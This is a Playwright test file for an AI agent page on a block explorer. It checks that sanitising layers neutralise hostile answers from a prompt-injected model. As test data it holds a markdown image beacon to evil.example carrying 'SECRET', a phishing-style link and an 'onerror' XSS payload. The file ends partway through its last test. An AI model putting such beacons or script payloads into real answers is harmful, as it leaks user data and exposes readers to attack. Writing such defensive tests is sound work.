import { expect, test } from "@playwright/test";

import { AGENT_ROUTER_LABEL } from "../src/lib/agent";

/**
 * The /ai-agent page, and the one property no unit test can prove: that a hostile answer
 * cannot put a fetchable third-party URL or an executable element into the DOM.
 *
 * The server's `StreamSanitizer` is unit-tested exhaustively and `AnswerMarkdown` is the
 * second, independent layer — but "the rendered page is safe" is a claim about the rendered
 * page. These tests stub the API so the browser receives an answer no real model would
 * produce, which is exactly the point: an injected model WOULD produce it.
 *
 * Skipped unless the build serves the route. The flag gates the page, so on a
 * production-shaped build there is nothing here to test and a hard failure would be noise.
 */

const AGENT_ON = process.env.NEXT_PUBLIC_AGENT_ENABLED === "1";

/** Serve a scripted SSE stream in place of the real API. */
async function stubAgent(page: import("@playwright/test").Page, events: string[]): Promise<void> {
  await page.route("**/agent/ask", async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "text/event-stream",
      body: events.join(""),
    });
  });
}

const sse = (event: string, data: unknown) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;

/**
 * A stub whose stream is pushed event by event from the test, for the states that only exist
 * mid-stream.
 *
 * `route.fulfill` cannot do this: a fulfilled body arrives as one chunk and then ends, so React
 * batches every event into one render and the request is never in flight afterwards. This
 * replaces `window.fetch` for the ask URL with a `ReadableStream` the test controls.
 */
async function openStream(page: import("@playwright/test").Page): Promise<{
  push: (event: string, data: unknown) => Promise<void>;
  close: () => Promise<void>;
}> {
  await page.addInitScript(() => {
    const original = window.fetch;
    let controller: ReadableStreamDefaultController<Uint8Array> | null = null;
    const encoder = new TextEncoder();
    Object.assign(window, {
      __pushSSE: (chunk: string) => controller?.enqueue(encoder.encode(chunk)),
      __endSSE: () => {
        controller?.close();
        controller = null;
      },
    });
    window.fetch = (input: RequestInfo | URL, init?: RequestInit) => {
      const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
      if (!url.includes("/agent/ask")) return original(input, init);
      let own: ReadableStreamDefaultController<Uint8Array> | null = null;
      const body = new ReadableStream<Uint8Array>({
        start(c) {
          controller = c;
          own = c;
        },
      });
      // Honour the abort the way a real fetch does — the pending read rejects — or `stop`
      // would leave the turn open forever in a test and never reach the console's `finally`.
      init?.signal?.addEventListener("abort", () => {
        try {
          own?.error(new DOMException("The operation was aborted.", "AbortError"));
        } catch {
          /* already closed */
        }
        if (controller === own) controller = null;
      });
      return Promise.resolve(
        new Response(body, { status: 200, headers: { "Content-Type": "text/event-stream" } }),
      );
    };
  });
  return {
    push: (event, data) =>
      page.evaluate(
        (chunk) => (window as unknown as { __pushSSE: (c: string) => void }).__pushSSE(chunk),
        sse(event, data),
      ),
    close: () => page.evaluate(() => (window as unknown as { __endSSE: () => void }).__endSSE()),
  };
}

async function ask(page: import("@playwright/test").Page, question: string): Promise<void> {
  await page.goto("/ai-agent");
  await page.getByLabel(/Ask a question/i).fill(question);
  await page.getByRole("button", { name: "send" }).click();
}

test.describe("the AI agent page", () => {
  test.skip(!AGENT_ON, "NEXT_PUBLIC_AGENT_ENABLED is not set for this build");

  test("warns about keys above the input, and names the vendors somewhere on the page", async ({
    page,
  }) => {
    await page.goto("/ai-agent");

    // Asserts the substance, not one phrasing, so a shorter notice that keeps every fact passes.
    //
    // The two halves are held to different standards. The key warning must be read before
    // typing, so it keeps the geometric assertion. The vendor names live in the "what leaves
    // this site when you ask" expander, so this asserts they are reachable, not that they are
    // visible before the box.
    const warning = page.getByText(/never paste a viewing key/i).first();
    await expect(warning).toBeVisible();

    const warningBox = await warning.boundingBox();
    const inputBox = await page.getByLabel(/Ask a question/i).boundingBox();
    expect(warningBox!.y).toBeLessThan(inputBox!.y);

    // The vendors are named, and naming them is not optional — /privacy lists them as separate
    // controllers. Opening the expander is allowed; removing the disclosure is not. Asserted
    // through the constant, so a change of vendor cannot leave the page naming someone else.
    await page.getByText(/what leaves this site when you ask/i).click();
    await expect(page.getByText(AGENT_ROUTER_LABEL).first()).toBeVisible();
  });

  test("the console holds most of the viewport — the agent IS the page", async ({ page }) => {
    await page.goto("/ai-agent");
    // Prose must not crowd the console; pinning the proportion keeps a future copy addition from
    // taking the space back.
    const pane = page.locator("div.panel").first();
    const box = await pane.boundingBox();
    const viewport = page.viewportSize()!;
    expect(box!.height).toBeGreaterThan(viewport.height * 0.4);
  });

  test("the empty state offers runnable prompts, and clicking one asks it", async ({ page }) => {
    await stubAgent(page, [
      sse("delta", { text: "Ironwood is the fourth shielded pool." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await page.goto("/ai-agent");

    const example = page.getByRole("button", { name: "what is Ironwood?" });
    await expect(example).toBeVisible();
    await example.click();

    // It asks immediately rather than only filling the box.
    await expect(page.getByText(/fourth shielded pool/)).toBeVisible();
    // And the prompts give way to the conversation.
    await expect(example).toHaveCount(0);
  });

  test("the long explanations are present but collapsed, not deleted", async ({ page }) => {
    await page.goto("/ai-agent");
    const refusals = page.getByRole("group").filter({ hasText: "what it will not do" });
    await expect(refusals).toHaveCount(1);
    // Closed by default: this is not first-paint text.
    expect(await refusals.evaluate((el) => (el as HTMLDetailsElement).open)).toBe(false);
    // Opening it still yields the refusal that matters most.
    await page.getByText("what it will not do").click();
    await expect(page.getByText(/no field anywhere here to paste one into/i)).toBeVisible();
  });

  test("offers no field that invites a viewing key", async ({ page }) => {
    await page.goto("/ai-agent");
    const labels = await page.locator("label, input, textarea").allTextContents();
    expect(labels.join(" ")).not.toMatch(/viewing key.*:|enter.*viewing key/i);
  });

  test("renders a streamed answer with its derived sources", async ({ page }) => {
    await stubAgent(page, [
      sse("status", { state: "thinking" }),
      sse("delta", { text: "Ironwood is the fourth shielded pool, " }),
      sse("delta", { text: "activated at block 3,428,143." }),
      sse("sources", { sources: [{ label: "block 3428143", href: "/block/3428143" }] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwood?");

    await expect(page.getByText(/fourth shielded pool/)).toBeVisible();
    await expect(page.getByRole("link", { name: /block 3428143/ })).toHaveAttribute(
      "href",
      "/block/3428143",
    );
  });

  test("a markdown image in the answer never becomes an element or a request", async ({ page }) => {
    const requests: string[] = [];
    page.on("request", (r) => requests.push(r.url()));

    await stubAgent(page, [
      sse("delta", { text: "Here you go ![beacon](https://evil.example/b?d=SECRET) done." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "tell me about a block");
    await expect(page.getByText(/Here you go/)).toBeVisible();

    // No image element, and — the part that actually matters — no request left for it.
    const answer = page.locator("article").last();
    await expect(answer.locator("img")).toHaveCount(0);
    expect(requests.filter((u) => u.includes("evil.example"))).toEqual([]);
    // The raw syntax must not be visible as text either; it is dropped, not escaped.
    await expect(page.getByText("![beacon]")).toHaveCount(0);
  });

  test("a link to a non-allowlisted host renders as text, never as an anchor", async ({ page }) => {
    await stubAgent(page, [
      sse("delta", { text: "Claim it at [this page](https://evil.example/claim) now." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "anything unusual?");

    await expect(page.getByText(/Claim it at/)).toBeVisible();
    const answer = page.locator("article").last();
    await expect(answer.locator('a[href*="evil.example"]')).toHaveCount(0);
  });

  test("HTML in the answer is never executed or rendered as markup", async ({ page }) => {
    const errors: string[] = [];
    page.on("pageerror", (e) => errors.push(e.message));

    await stubAgent(page, [
      sse("delta", { text: "Look: <img src=x onerror=alert(1)> and <b>bold</b> text." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "describe a block");
    await expect(page.getByText(/Look:/)).toBeVisible();

    const answer = page.locator("article").last();
    await expect(answer.locator("img")).toHaveCount(0);
    await expect(answer.locator("b")).toHaveCount(0);
    expect(errors).toEqual([]);
  });

  test("a budget-exhausted 503 reads as prose, never as a JSON envelope", async ({ page }) => {
    await page.route("**/agent/ask", async (route) => {
      await route.fulfill({
        status: 503,
        contentType: "application/json",
        body: JSON.stringify({
          // The server's real sentence, not a paraphrase: the refusal names when the budget is
          // back, and the client echoes that sentence rather than substituting its own.
          error: {
            code: "budget_exhausted",
            message: "the agent is resting — its allowance is spent; it is back in about 4 minutes",
          },
          requestId: "abc",
          asOf: 1785778000,
        }),
      });
    });
    await ask(page, "what is Ironwood?");

    // Matched on words the page uses only here, not on `/resting/`, which also appears in the
    // provider disclosure prose and would resolve to two elements.
    await expect(page.getByText(/allowance is spent/i)).toBeVisible();
    // The wait is the half that matters: a reader told "about 4 minutes" does not conclude the
    // site is broken.
    await expect(page.getByText(/back in about 4 minutes/i)).toBeVisible();
    await expect(page.getByText(/requestId|"error"/)).toHaveCount(0);
  });

  test("the pane is one height and the transcript starts at the top, whatever the answer's length", async ({
    page,
  }) => {
    /**
     * Sending an example must not resize or reflow the pane. Two things are asserted: the pane's
     * height must not move, and the first line of the transcript must appear at the top of the
     * pane, where the empty state's text was. Bottom-aligning the transcript would keep the height
     * constant while moving the content the full height of the pane, which reads as a resize.
     */
    await stubAgent(page, [
      sse("delta", { text: "Yo." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await page.goto("/ai-agent");

    const pane = page.locator("div.panel").first();
    const empty = (await pane.boundingBox())!;
    // The first tile in reading order — the examples are a grid, and "what is Ironwood?" sits on
    // its second row.
    const firstExampleTop = (await page
      .getByRole("button", { name: "what happened in block 3428150?" })
      .boundingBox())!.y;

    await page.getByRole("button", { name: "what is Ironwood?" }).click();
    await expect(page.getByText("Yo.")).toBeVisible();

    const answered = (await pane.boundingBox())!;
    expect(Math.abs(answered.height - empty.height)).toBeLessThan(1);
    expect(Math.abs(answered.y - empty.y)).toBeLessThan(1);

    // The question line lands within a few pixels of where the first example sat: content grew
    // downward from the top rather than being pushed to the foot of the pane.
    const question = (await page.locator("article").first().boundingBox())!;
    expect(question.y).toBeLessThan(firstExampleTop + 24);
    // …and the answer is in the top half of the pane, not floating above the composer.
    const answer = (await page.getByText("Yo.").boundingBox())!;
    expect(answer.y).toBeLessThan(empty.y + empty.height / 2);
  });

  test("preamble abandoned for a tool call lands in the trail as narration, never the answer", async ({
    page,
  }) => {
    /**
     * Preamble is never drawn as answer text: `reset` discards it from the answer, and the server
     * follows the reset with a `narration` event that the trail shows between the step rows. So
     * the assertion is two-sided: the preamble appears exactly once, inside
     * `[data-step="narration"]`, and the answer body never contains it.
     */
    // Deliberately worse than anything production can send — the server's `narrationText` would
    // have deleted the image — so this exercises the client's own structural stop: the row is a
    // plain text node, so markdown in it stays inert characters.
    const preamble = "Let me check ![px](https://evil.example/q) on the price/status side.";
    const stream = await openStream(page);
    await page.goto("/ai-agent");
    const pane = page.locator("div.panel").first();
    const before = (await pane.boundingBox())!;

    // Nothing the page renders may fetch from a narrated URL: the row is a plain text node and
    // the server sanitises anyway, so a request to this host is a failed invariant, not flake.
    const evilRequests: string[] = [];
    page.on("request", (r) => {
      if (r.url().includes("evil.example")) evilRequests.push(r.url());
    });

    await page.getByLabel(/Ask a question/i).fill("zec price evolution everyday since last week");
    await page.getByRole("button", { name: "send" }).click();

    // The delta never reaches the answer body — the answer is drawn once, at the end. The trail
    // shows its first sentence as the live working line, as text: the image markup inside it is
    // already post-sanitiser and creates no element.
    await stream.push("delta", { text: preamble });
    await expect(page.locator('[data-step="working"]')).toHaveText(preamble);
    await expect(page.getByText(preamble)).toHaveCount(1);
    expect(await page.locator('[data-step="working"] img, [data-step="working"] a').count()).toBe(
      0,
    );

    // The round turns out to be a tool call: reset discards the answer copy, narration carries
    // the working to the trail, and the status carries the step — in the server's own order.
    await stream.push("reset", {});
    await stream.push("narration", { text: preamble });
    await stream.push("status", { state: "looking-up", tool: "zec_price_history" });
    // Exactly one copy on the page, and it is the trail's, not the answer's.
    await expect(page.locator('[data-step="narration"]')).toHaveText(preamble);
    await expect(page.getByText(preamble)).toHaveCount(1);
    // The discarded round leaves NO "answering" row behind it: a row saying the agent was
    // answering, placed before a lookup, would describe a step that did not happen.
    await expect(page.getByText(/looking up the daily price history/i)).toBeVisible();
    await expect(page.locator('[data-step="answering"]')).toHaveCount(0);

    await stream.push("delta", { text: "ZEC closed at $46.12 yesterday, on Yahoo's closes." });
    await stream.push("sources", { sources: [] });
    await stream.push("done", { stopReason: "complete" });
    await stream.close();
    await expect(page.getByText(/closed at \$46\.12/)).toBeVisible();
    // Settled: the answer body still holds none of the preamble — the one copy stays a trail row
    // (folded now, so it is in the DOM without being visible).
    await expect(page.getByText(preamble)).toHaveCount(1);
    await expect(page.locator('[data-step="narration"]')).toBeHidden();
    expect(evilRequests).toEqual([]);

    // The pane did not move or resize through any of it: a fixed-height, top-aligned pane
    // reflows its content — narration rows included — inside a box that does not move.
    const after = (await pane.boundingBox())!;
    expect(Math.abs(after.height - before.height)).toBeLessThan(1);
    expect(Math.abs(after.y - before.y)).toBeLessThan(1);
  });

  /**
   * The thinking trail — the steps that produced an answer, open while the turn runs and folded
   * to one line afterwards.
   *
   * Two kinds of row: recorded facts about our loop's execution (this status, these arguments,
   * this long), and the model's own pre-tool-call narration between them, sanitised server-side
   * and rendered as plain text.
   */
  test("the trail shows each step as it happens, then folds into one line", async ({ page }) => {
    const stream = await openStream(page);
    await page.goto("/ai-agent");
    const pane = page.locator("div.panel").first();
    const before = (await pane.boundingBox())!;

    await page.getByLabel(/Ask a question/i).fill("what happened in block 3428150?");
    await page.getByRole("button", { name: "send" }).click();

    // Present from the moment send is pressed, before a byte has come back: the seeded first step
    // stops the pane going blank while the request opens. The header is the current action:
    // "thinking" until a lookup opens, and our own waits are never rows.
    await expect(page.locator("[data-trail-headline]")).toHaveText("reading the question");
    await expect(page.locator('[data-step="thinking"]')).toHaveCount(0);

    // A round the server has flagged as working streams as `working` events, and the live line
    // rolls with it, so the trail never reads as stuck.
    await stream.push("working", { text: "Fetching that block. " });
    await expect(page.locator("[data-trail-headline]")).toHaveText("working");
    await expect(page.locator('[data-step="working"]')).toHaveText("Fetching that block.");
    await stream.push("working", { text: "Then its fee." });
    await expect(page.locator('[data-step="working"]')).toHaveText(
      "Fetching that block. Then its fee.",
    );
    // Working never reaches the answer body.
    await expect(page.getByText(/Then its fee/)).toHaveCount(1);

    // The narration precedes its lookup, in the server's own order: working, then the step. It
    // is a row immediately — it arrives finished — while the lookup that follows is the header.
    // It also takes the live line's place: one copy of the working on the page, in the row.
    await stream.push("narration", { text: "Fetching that block." });
    await expect(page.locator('[data-step="working"]')).toHaveCount(0);
    await expect(page.locator('[data-step="narration"]')).toHaveText("Fetching that block.");

    // Each lookup names the tool AND its subject, which is the whole point of the row.
    await stream.push("status", {
      state: "looking-up",
      tool: "lookup_block",
      detail: "3428150",
    });
    // While it runs it is the HEADER, not a row; it becomes a row once the next step begins.
    await expect(page.locator("[data-trail-headline]")).toHaveText(
      "looking up the block · 3428150",
    );
    const lookup = page.locator('[data-step="lookup"]');
    await expect(lookup).toHaveCount(0);

    await stream.push("delta", { text: "Block 3,428,150 carried 2 transactions." });
    // Tokens are arriving, so the header says so, and the trail carries ONE live line: the first
    // sentence of the round's prose. It is not the answer yet and is drawn nowhere else.
    await expect(page.locator("[data-trail-headline]")).toHaveText("working");
    await expect(page.locator('[data-step="working"]')).toHaveText(
      "Block 3,428,150 carried 2 transactions.",
    );
    // The finished lookup is a row now — under its narration, so the arguments alone: the
    // sentence above already said what was looked up.
    await expect(lookup).toContainText("3428150");
    await expect(lookup).not.toContainText("looking up");
    await expect(page.locator('[data-step="answering"]')).toHaveCount(0);
    // The prose is NOT in the answer body yet — only the trail's live line carries it.
    await expect(page.getByText(/carried 2 transactions/)).toHaveCount(1);

    await stream.push("sources", { sources: [] });
    await stream.push("done", { stopReason: "complete" });
    await stream.close();

    // Folded to the duration alone, with the rows still there behind it. The live line is gone:
    // the answer committed below, once.
    const summary = page.getByText(/^worked for \d+\.\d+s$/);
    await expect(summary).toBeVisible();
    await expect(lookup).toBeHidden();
    await expect(page.locator('[data-step="working"]')).toHaveCount(0);
    await expect(page.locator("[data-trail-summary]")).toHaveCount(0);
    await summary.click();
    await expect(lookup).toBeVisible();
    // ONE row for the narration and the lookup it preceded: the sentence, then the arguments —
    // with no "looking up" label repeating what the sentence said, and no tool name.
    await expect(page.locator('li[data-row="grouped"]')).toHaveCount(1);
    await expect(page.locator("[data-step]")).toHaveText(["Fetching that block.", /3428150/]);
    await expect(lookup).not.toContainText("looking up");
    await expect(lookup).not.toContainText("lookup_block");

    // The pane did not move or resize through any of it — opening and closing the trail reflows
    // content inside a box that stays exactly where it is.
    const after = (await pane.boundingBox())!;
    expect(Math.abs(after.height - before.height)).toBeLessThan(1);
    expect(Math.abs(after.y - before.y)).toBeLessThan(1);
  });

  test("an outside click never closes a trail the reader opened", async ({ page }) => {
    /*
     * `DismissPopovers` closes any `<details data-popover>` on an outside pointerdown, which is
     * right for a filter menu and wrong for content. The trail carries no such attribute, and
     * this keeps it that way: collapsing content a reader deliberately opened is a bug.
     */
    await stubAgent(page, [
      sse("status", { state: "looking-up", tool: "lookup_block", detail: "3428150" }),
      sse("delta", { text: "Two transactions." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what happened in block 3428150?");
    await expect(page.getByText("Two transactions.")).toBeVisible();

    await page.getByText(/^worked for /).click();
    const lookup = page.locator('[data-step="lookup"]');
    await expect(lookup).toBeVisible();

    // Click well away from the trail, the way a reader does when they go back to reading.
    await page.locator("h1").click();
    await expect(lookup).toBeVisible();
  });

  test("a hostile subject renders as text, never as markup or a request", async ({ page }) => {
    /*
     * A tool call's arguments are the model's own words, and a model reading an injected coinbase
     * tag or pool symbol can be steered into quoting it back into one. `describeToolCall`
     * sanitises server-side; this asserts the rendered page, which is the only place the claim
     * "it is text" can actually be checked.
     */
    const requests: string[] = [];
    page.on("request", (r) => requests.push(r.url()));
    await stubAgent(page, [
      sse("status", {
        state: "looking-up",
        tool: "lookup_block",
        detail: "![x](https://evil.example/p)",
      }),
      sse("delta", { text: "Done." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "block 1");
    await expect(page.getByText("Done.")).toBeVisible();
    await page.getByText(/^worked for /).click();

    const lookup = page.locator('[data-step="lookup"]');
    await expect(lookup).toContainText("![x](https://evil.example/p)");
    // Rendered as text: no element was created from it, and nothing was fetched.
    expect(await lookup.locator("img, a, script").count()).toBe(0);
    expect(requests.filter((u) => u.includes("evil.example"))).toEqual([]);
  });

  test("every tool the agent can call has words for the status line", async ({ page }) => {
    // The status line is the whole of what a reader sees of a lookup, so a tool with no entry in
    // `describeTool` would read as "looking up the chain". Driven through the real event,
    // mid-stream — the line only exists while the request is in flight, hence `openStream`.
    const stream = await openStream(page);
    await page.goto("/ai-agent");
    for (const [tool, words] of [
      ["zec_price_history", /looking up the daily price history/i],
      ["wrapped_zec_pools", /wrapped-ZEC pools/i],
      ["explorer_insights", /this explorer's own analytics/i],
      ["lookup_block", /looking up the block/i],
    ] as const) {
      await page.getByLabel(/Ask a question/i).fill(`use ${tool}`);
      await page.getByRole("button", { name: "send" }).click();
      await stream.push("status", { state: "looking-up", tool });
      await expect(page.getByText(words)).toBeVisible();
      await stream.push("delta", { text: "Done." });
      await stream.push("done", { stopReason: "complete" });
      await stream.close();
      await expect(page.getByRole("button", { name: "send" })).toBeVisible();
    }
  });

  test("the composer promises no keyboard shortcut it only sometimes honours", async ({ page }) => {
    /**
     * The ↑ shortcut works and is kept, but the composer carries no hint for it: ↑ fires only in
     * an empty composer, so an unconditional hint would be untrue. Both halves are asserted, so
     * removing the hint and the binding together cannot pass as a copy change.
     */
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwood?");
    await expect(page.getByText("An answer.")).toBeVisible();

    await expect(page.getByText(/edits your last question/i)).toHaveCount(0);
    // The key still works from wherever focus landed after the answer — no click first.
    await page.keyboard.press("ArrowUp");
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("what is Ironwood?");

    // And it does not steal a caret move inside a draft the visitor is still writing.
    await page.getByLabel(/Ask a question/i).fill("a half-typed follow-up");
    await page.keyboard.press("ArrowUp");
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("a half-typed follow-up");
  });

  test("a partial answer is never reported as no answer at all", async ({ page }) => {
    // A long answer cut mid-sentence must not be labelled "The model did not answer". The server
    // emits `error` mid-stream when the turn throws, so this reproduces that byte sequence —
    // deltas, then an error envelope, then the body ends.
    await stubAgent(page, [
      sse("delta", { text: "The transaction paid 0.0003 ZEC, and whether that output is a" }),
      sse("error", {
        error: { code: "upstream_unavailable", message: "the model provider did not answer" },
        requestId: "abc",
        asOf: 1785778000,
      }),
    ]);
    await ask(page, "explain that transaction");

    await expect(page.getByText(/whether that output is a/)).toBeVisible();
    await expect(page.getByText(/cut off before the end/i)).toBeVisible();
    await expect(page.getByText(/did not answer/i)).toHaveCount(0);
  });

  test("a length truncation says so, and keeps saying so", async ({ page }) => {
    await stubAgent(page, [
      sse("delta", { text: "Ironwood is the fourth shielded pool and" }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "length" }),
    ]);
    await ask(page, "what is Ironwood?");

    // `done` already gave the accurate reason, so the end-of-stream fallback must not overwrite it
    // with the vaguer "cut off" note — a settled exchange is left alone.
    await expect(page.getByText(/hit its length limit/i)).toBeVisible();
    await expect(page.getByText(/cut off before the end/i)).toHaveCount(0);
  });

  test("every link out of an answer opens in a new tab", async ({ page }) => {
    // The conversation lives only in React state, so a same-tab navigation destroys the answer the
    // citation belongs to. Both routes are checked: the derived SOURCES list and a link the model
    // wrote into the answer body itself.
    await stubAgent(page, [
      sse("delta", { text: "See [block 3428150](/block/3428150) for the migration." }),
      sse("sources", { sources: [{ label: "block 3428150", href: "/block/3428150" }] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwood?");

    const links = page.locator("article a[href='/block/3428150']");
    await expect(links).toHaveCount(2);
    for (const link of await links.all()) {
      await expect(link).toHaveAttribute("target", "_blank");
      await expect(link).toHaveAttribute("rel", /noopener/);
      await expect(link).toHaveAttribute("rel", /noreferrer/);
    }
  });

  test("copying an answer puts the whole answer on the clipboard", async ({ page, context }) => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    // Two deltas and a markdown link, so a copy of the rendered text or of one delta would be
    // visibly short of the whole.
    await stubAgent(page, [
      sse("delta", { text: "Ironwood is the fourth shielded pool, " }),
      sse("delta", { text: "activated at [block 3428143](/block/3428143)." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwood?");
    await expect(page.getByText(/fourth shielded pool/)).toBeVisible();

    await page.getByRole("button", { name: /copy answer/i }).click();
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(
      "Ironwood is the fourth shielded pool, activated at [block 3428143](/block/3428143).",
    );
  });

  test("edit puts the last question back in the box and drops the turn it produced", async ({
    page,
  }) => {
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwoodd?");
    await expect(page.getByText("An answer.")).toBeVisible();

    await page.getByRole("button", { name: "edit" }).click();
    // The question is editable again, and the superseded turn is gone rather than sitting above a
    // near-duplicate of itself — which would also be replayed to the model as history.
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("what is Ironwoodd?");
    await expect(page.getByText("An answer.")).toHaveCount(0);

    // The keyboard route is the same action, not a second one with different semantics.
    await page.getByRole("button", { name: "send" }).click();
    await expect(page.getByText("An answer.")).toBeVisible();
    await page.getByLabel(/Ask a question/i).press("ArrowUp");
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("what is Ironwoodd?");
    await expect(page.getByText("An answer.")).toHaveCount(0);
  });

  test("cancelling an edit gives the answer back", async ({ page }) => {
    /**
     * `edit` sets the turn it lifts aside — a superseded exchange left on screen would be replayed
     * to the model as history — but the drop is a hold, not a deletion: opening the control to
     * look must not destroy an answer, and this page stores nothing to restore it from.
     */
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwood?");
    await expect(page.getByText("An answer.")).toBeVisible();

    await page.getByRole("button", { name: "edit" }).click();
    await expect(page.getByText("An answer.")).toHaveCount(0);

    await page.getByRole("button", { name: "cancel" }).click();
    // The turn comes back whole — question, answer and all — and the composer is empty again,
    // so the question is not sitting in the box AND on screen at once.
    await expect(page.getByText("An answer.")).toBeVisible();
    await expect(page.getByText("what is Ironwood?")).toBeVisible();
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("");
    await expect(page.getByRole("button", { name: "cancel" })).toHaveCount(0);
  });

  test("Escape cancels an edit, and cancel is absent when there is nothing to cancel", async ({
    page,
  }) => {
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    // Nothing pending: the control must not sit there permanently offering to cancel nothing.
    await expect(page.getByRole("button", { name: "cancel" })).toHaveCount(0);

    await ask(page, "what is Ironwood?");
    await expect(page.getByText("An answer.")).toBeVisible();
    await page.getByRole("button", { name: "edit" }).click();
    // Typing first, because the interesting case is abandoning a STARTED edit — the draft goes
    // with it, since "cancel" means the turn survives unchanged, not that the edit half-applies.
    await page.getByLabel(/Ask a question/i).fill("what is Orchard?");
    await page.getByLabel(/Ask a question/i).press("Escape");
    await expect(page.getByText("An answer.")).toBeVisible();
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("");
  });

  test("sending the edited question discards the turn it replaced", async ({ page }) => {
    // The whole reason `edit` drops the turn: the superseded question must never reach the
    // model as history, and cancellability must not quietly turn a replacement into a retry.
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwoodd?");
    await expect(page.getByText("An answer.")).toBeVisible();
    await page.getByRole("button", { name: "edit" }).click();
    await page.getByLabel(/Ask a question/i).fill("what is Ironwood?");
    await page.getByRole("button", { name: "send" }).click();

    await expect(page.getByText("what is Ironwood?")).toBeVisible();
    await expect(page.getByText("what is Ironwoodd?")).toHaveCount(0);
    await expect(page.getByRole("button", { name: "cancel" })).toHaveCount(0);
  });

  test("edit sits with the question, never under the answer", async ({ page }) => {
    // A control's position is a claim about what it acts on: beside `copy` at the foot of the
    // turn, `edit` would read as an offer to edit the answer. Asserted on DOM order rather than
    // a class, so a restyle cannot silently move it.
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "what is Ironwood?");
    await expect(page.getByText("An answer.")).toBeVisible();

    const editPrecedesAnswer = await page.evaluate(() => {
      const edit = [...document.querySelectorAll("button")].find(
        (b) => b.textContent?.trim() === "edit",
      );
      const answer = [...document.querySelectorAll("p")].find((p) =>
        p.textContent?.includes("An answer."),
      );
      if (!edit || !answer) return null;
      return (edit.compareDocumentPosition(answer) & Node.DOCUMENT_POSITION_FOLLOWING) !== 0;
    });
    expect(editPrecedesAnswer).toBe(true);
  });

  test("edit is available when the answer never arrived", async ({ page }) => {
    // The question you most want to change is the one that failed, and gating `edit` on a
    // settled answer hid it exactly then.
    await stubAgent(page, [sse("error", { message: "upstream is unavailable" })]);
    await ask(page, "what is Ironwood?");
    await expect(page.getByRole("button", { name: "edit" })).toBeEnabled();
    await page.getByRole("button", { name: "edit" }).click();
    await expect(page.getByLabel(/Ask a question/i)).toHaveValue("what is Ironwood?");
  });

  test("clear discards the whole conversation, and is absent while one is running", async ({
    page,
  }) => {
    /*
     * The word rather than an icon, at the top of the transcript rather than beside `send`.
     *
     * No confirmation: a destructive step may be taken on intent, never on inspection, and
     * clicking a button labelled `clear` is intent. It is absent mid-turn because clearing then
     * would abandon an answer with the request still in flight.
     */
    await stubAgent(page, [
      sse("delta", { text: "Ironwood is the fourth shielded pool." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await page.goto("/ai-agent");

    // Nothing to clear yet, so no control: a control that can only do nothing is refused.
    await expect(page.getByRole("button", { name: /clear/ })).toHaveCount(0);

    await page.getByLabel(/Ask a question/i).fill("what is Ironwood?");
    await page.getByRole("button", { name: "send" }).click();
    await expect(page.getByText(/fourth shielded pool/)).toBeVisible();

    await page.getByRole("button", { name: /clear/ }).click();
    await expect(page.getByText(/fourth shielded pool/)).toHaveCount(0);
    // Back to the empty state, not merely an emptied one: the runnable examples return.
    await expect(page.getByRole("button", { name: "what is Ironwood?" })).toBeVisible();
    await expect(page.getByRole("button", { name: /clear/ })).toHaveCount(0);
  });

  test("a hash in an answer opens its page in a new tab", async ({ page }) => {
    const hash = "ab".repeat(32);
    await stubAgent(page, [
      sse("delta", { text: `Transaction \`${hash}\` paid 0.0001 ZEC.` }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
    await ask(page, "tell me about that transaction");
    await expect(page.getByText(/paid 0.0001 ZEC/)).toBeVisible();

    const link = page.locator(`a[href="/search?q=${hash}"]`);
    await expect(link).toHaveAttribute("target", "_blank");
    // A 64-hex string is ambiguous between a txid and a block hash, so it resolves through the
    // site's own search rather than guessing one and 404ing on the other.
    await expect(link).toHaveAttribute("rel", /noopener/);
  });

  test("stores nothing: no cookie and no browser storage after a conversation", async ({
    page,
    context,
  }) => {
    await stubAgent(page, [
      sse("delta", { text: "An answer." }),
      sse("sources", { sources: [] }),
      sse("done", { stopReason: "complete" }),
    ]);
